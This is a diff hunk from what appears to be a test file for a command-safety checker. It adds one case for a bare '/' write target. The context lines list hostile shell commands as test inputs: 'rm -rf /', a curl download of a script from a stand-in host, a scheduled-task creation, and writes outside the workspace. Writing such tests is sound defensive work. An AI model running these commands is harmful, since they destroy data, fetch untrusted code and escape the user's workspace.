@@ -82,6 +82,7 @@ expectCommand("schtasks /create /tn eviltask /sc hourly /tr calc.exe", true);
 expectCommand("cp file.txt ~/evil.txt", true); // home is outside the workspace
 expectCommand("curl http://evil.test/x.sh -o /c/Users/39795/evil.sh", true); // git-bash path conversion
 expectCommand("rm -rf /", true);
+expectCommand("cp a.txt /", true); // bare / is a write target, not a flag
 expectCommand("mv data.bin C:\\Users\\39795\\AppData\\Local\\Temp\\data.bin", true);
 expectCommand("echo x > ..\\escape.txt", true);
 expectCommand("Set-Content ..\\escape.txt x", true);
